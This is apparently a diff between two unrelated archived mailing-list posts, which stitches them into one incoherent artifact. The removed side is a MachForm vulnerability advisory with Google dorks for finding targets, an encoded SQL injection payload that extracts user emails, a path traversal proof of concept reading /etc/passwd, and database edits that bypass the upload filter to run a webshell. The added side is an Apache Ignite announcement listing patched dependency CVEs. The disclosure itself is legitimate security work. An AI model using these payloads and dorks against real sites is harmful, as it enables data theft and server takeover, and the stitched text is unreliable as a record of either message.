@@ -1,115 +1,141 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/05/30/1
-Message-ID: <CAOGhsh0gWVyfmXt1hUnxCC45KYRYAE0dfXu3xR_gufSJ3W8CHg@mail.gmail.com>
-Date: Wed, 30 May 2018 21:23:20 +0200
-From: Amine Taouirsa <taouirsa@...il.com>
-To: vuln@...unia.com, bugs@...uritytracker.com,  submissions@...ketstormsecurity.org, bugtraq@...urityfocus.com,  oss-security@...ts.openwall.com
-Subject: MachForm Multiple Vulnerabilities CVE-2018-6409/CVE-2018-6410/CVE-2018-6411
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/12/07/1
+Message-ID: <CALUCNEsCwE0fC2XCHi996=OdUCZZLK8WzF2KOdaLPYkZzWE_8A@mail.gmail.com>
+Date: Fri, 7 Dec 2018 17:06:27 +0300
+From: Dmitriy Pavlov <dpavlov@...che.org>
+To: user <user@...ite.apache.org>, dev <dev@...ite.apache.org>,  "security@...ite.apache.org" <security@...ite.apache.org>, announce@...che.org,  oss-security@...ts.openwall.com
+Subject: [ANNOUNCE] Apache Ignite 2.7.0 Vulnerable Dependecies Updates
 Content-Type: text/plain; charset=utf-8
 
- Vendor: Appnitro
-Product webpage: https://www.machform.com/
-Full-Disclose: https://metalamin.github.io/MachForm-not-0-day-EN/
-Fix: https://www.machform.com/blog-machform-423-security-release/
-
-Author: Amine Taouirsa
-Twitter: @metalamin
-
-Google dork examples:
-----------------------
-"machform" inurl:"view.php"
-"machform" inurl:"embed.php"
-
-Summary:
----------
-The form creation platform MachForm from Appnitro is subject to SQL
-injections that lead to path traversal and arbitrary file upload.
-
-The application is widely deployed and with some google dorks it’s possible
-to find various webpages storing sensitive data as credit card numbers with
-corresponding security codes. Also, the arbitrary file upload can let an
-attacker get control of the server by uploading a WebShell.
-
-[1] SQL injection (CVE-2018-6410):
--------------------------
-
-[1.1] Description:
-The software is subject to SQL injections in the ‘download.php’ file.
-
-[1.2] Parameters and statement:
-This SQLi can be found on the parameter ‘q’ which a base64 encoded value
-for the following parameters:
-
-  $form_id  = $params['form_id'];
-  $id       = $params['id'];
-  $field_name = $params['el'];
-  $file_hash  = $params['hash'];
+The Apache Ignite Community is pleased to announce that recently released
+Apache Ignite 2.7.0 replaces some vulnerable dependencies to versions with
+fixes.
 
 
-So the injectable parameters are ‘el’ and ‘form_id’ obtaining error-based,
-stacked queries and time-based blind SQL injections. This is due to the
-following vulnerable statement:
 
-  $query  = "select {$field_name} from `".MF_TABLE_PREFIX."form_{$form_id}`
-where id=?";
+Apache Ignite https://ignite.apache.org/  is a memory-centric distributed
+database, caching, and processing platform for transactional, analytical,
+and streaming workloads delivering in-memory speeds at petabyte scale.
 
 
-[1.3] POC
-Proof of concept to get the first user mail:
-  http:// [URL] / [Machform_folder] /download.php?q=ZWw9IChTRUxFQ1
-QgMSBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoMHgyMDIwLChTRUxFQ1
-QgTUlEKCh1c2VyX2VtYWlsKSwxLDUwKSBGUk9NIGFwX3VzZXJzIE9SREVSIE
-JZIHVzZXJfaWQgTElNSVQgMCwxKSwweDIwMjAsRkxPT1IoUkFORCgwKSoyKS
-l4IEZST00gSU5GT1JNQVRJT05fU0NIRU1BLkNIQVJBQ1RFUl9TRVRTIEdST1
-VQIEJZIHgpYSkgOyZpZD0xJmhhc2g9MSZmb3JtX2lkPTE=
 
-Which is the base64 encoding for:
-  el= (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x2020,(SELECT
-MID((user_email),1,50) FROM ap_users ORDER BY user_id LIMIT
-0,1),0x2020,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP
-BY x)a) ;&id=1&hash=1&form_id=1
+Apache Ignite 2.7 replaced following dependencies in to avoid usage of
+vulnerable 3rd party software by end users:
 
 
-[2] Path traversal (CVE-2018-6409):
------------------------------------
 
-[2.1] Descrition
-download.php’ is used to serve stored files from the forms answers.
-Modifying the name of the file to serve on the corresponding ap_form table
-leads to a path traversal vulnerability.
+Apache Log4j
+https://nvd.nist.gov/vuln/detail/CVE-2017-5645
 
-[2.2] POC
-First we need to change the name for the element on the form:
-update ap_form_58009 set element_4="../../../../../../.
-./../../../../../../../../../etc/passwd" where id=1;
+FasterXML jackson-databind
+https://nvd.nist.gov/vuln/detail/CVE-2017-15095 ,
 
-Now in order to be able to download it, we need to access:
-  http:// [URL] / [Machform_folder] /download.php?q=ZWw9NCZpZD0xJm
-hhc2g9NDAyYmEwMjMwZDZmNDRhMmRlNTkwYWMxMTEwN2E0NTgmZm9ybV9pZD01ODAwOQo=
+https://nvd.nist.gov/vuln/detail/CVE-2017-17485 ,
 
-Which is the base64 encoding for;
-  el=4&id=1&hash=402ba0230d6f44a2de590ac11107a458&form_id=58009
+https://nvd.nist.gov/vuln/detail/CVE-2017-7525 ,
 
-Note that hash is the MD5 of the corresponding filename:
-  md5("../../../../../../../../../../../../../../../../etc/passwd") =
-402ba0230d6f44a2de590ac11107a458
+https://nvd.nist.gov/vuln/detail/CVE-2018-5968 ,
 
-[3] Bypass file upload filter (CVE-2018-6411):
-----------------------------------------------
+https://nvd.nist.gov/vuln/detail/CVE-2018-7489
 
-When the form is set to filter a blacklist, it automatically add dangerous
-extensions to the filters.
-If the filter is set to a whitelist, the dangerous extensions can be
-bypassed.
 
-This can be done directly on the database via SQLi
-update ap_form_elements set
-element_file_type_list="php",element_file_block_or_allow="a"
-where form_id=58009 and element_id=4;
 
-Once uploaded the file can be found and executed in the following URL:
-http:// [URL] / [Machform_folder] /data/form_58009/files/ [filename]
+Scala
+https://nvd.nist.gov/vuln/detail/CVE-2017-15288
 
-The filename can be found in the database
-SELECT element_4 FROM ap_form_58009 WHERE id=1;
+Apache Commons
+https://nvd.nist.gov/vuln/detail/CVE-2015-6420 ,
+
+https://nvd.nist.gov/vuln/detail/CVE-2015-7501 ,
+
+https://nvd.nist.gov/vuln/detail/CVE-2017-15708
+
+
+
+Netty Project
+
+https://nvd.nist.gov/vuln/detail/CVE-2016-4970
+
+JCraft
+
+https://nvd.nist.gov/vuln/detail/CVE-2016-5725
+
+
+
+Apache Tomcat
+https://nvd.nist.gov/vuln/detail/CVE-2016-3092 ,
+
+https://nvd.nist.gov/vuln/detail/CVE-2016-8735 ,
+
+https://nvd.nist.gov/vuln/detail/CVE-2018-8014
+
+
+Guava
+https://nvd.nist.gov/vuln/detail/CVE-2018-10237
+
+Apache Camel
+https://nvd.nist.gov/vuln/detail/CVE-2015-5344 ,
+
+https://nvd.nist.gov/vuln/detail/CVE-2015-5348 ,
+
+https://nvd.nist.gov/vuln/detail/CVE-2016-8749 ,
+
+https://nvd.nist.gov/vuln/detail/CVE-2017-12633 ,
+
+https://nvd.nist.gov/vuln/detail/CVE-2017-12634  ,
+
+https://nvd.nist.gov/vuln/detail/CVE-2017-3159 ,
+
+https://nvd.nist.gov/vuln/detail/CVE-2017-5643
+
+Spring Framework
+
+https://nvd.nist.gov/vuln/detail/CVE-2018-1257 ,
+
+https://nvd.nist.gov/vuln/detail/CVE-2018-1258
+
+
+
+Spring Data Commons
+
+https://nvd.nist.gov/vuln/detail/CVE-2018-1259 ,
+
+https://nvd.nist.gov/vuln/detail/CVE-2018-1273
+
+
+
+Jetty
+
+https://nvd.nist.gov/vuln/detail/CVE-2016-4800 ,
+
+https://nvd.nist.gov/vuln/detail/CVE-2017-9735 ,
+
+https://nvd.nist.gov/vuln/detail/CVE-2016-4800 ,
+
+https://nvd.nist.gov/vuln/detail/CVE-2017-9735 ,
+
+https://nvd.nist.gov/vuln/detail/CVE-2016-4800 ,
+
+https://nvd.nist.gov/vuln/detail/CVE-2017-7658
+
+
+
+Lucene
+https://nvd.nist.gov/vuln/detail/CVE-2017-12629
+
+Mitigation:
+•    Upgrade to Apache Ignite 2.7 or later version
+
+
+
+Credit:
+Segu Riluvan discovered the usage of vulnerable modules in dependencies of
+Apache Ignite.
+
+
+Thanks for everyone who was involved into dependencies migration.
+
+Best Regards,
+
+Dmitriy Pavlov on behalf of Apache Ignite community
 
